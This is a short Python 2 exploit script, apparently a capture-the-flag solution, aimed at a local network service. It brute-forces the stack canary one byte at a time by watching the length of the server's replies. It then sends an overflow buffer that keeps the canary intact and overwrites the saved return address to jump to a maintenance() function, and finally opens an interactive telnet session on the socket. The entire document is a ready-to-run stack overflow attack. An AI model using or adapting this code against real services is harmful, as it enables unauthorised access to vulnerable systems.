import struct, telnetlib, socket

def connect(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))
  return s

#bruteforce to detect canary
padding = 'A'*122
canary = ''
for i in range(8):
  for j in range(0, 256):
    tmp = struct.pack('B', j)
    s =  connect('localhost', 25500)
    buf = padding + canary + tmp
    s.send(buf)
    recv = s.recv(2048)
    if len(recv) > 30:
      print 'found: 0x%02x' % j
      canary += tmp
      s.close()
      break
    s.close()
print 'canary is 0x%08x' % struct.unpack('<Q', canary)[0]
#canary = '\x00\xa7\xda\xc4\xb0\xb5\x04\x00' #detected canary value

#overflow return address
maintenance = 0x0804862b #address of maintenance()
s = connect('localhost', 25500)
buf  = padding 
buf += canary
buf += 'A'*8  #padding
buf += struct.pack('<I', 0xdeadbeef) #old ebp
buf += struct.pack('<I', maintenance) #return address
s.send(buf)
print s.recv(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()
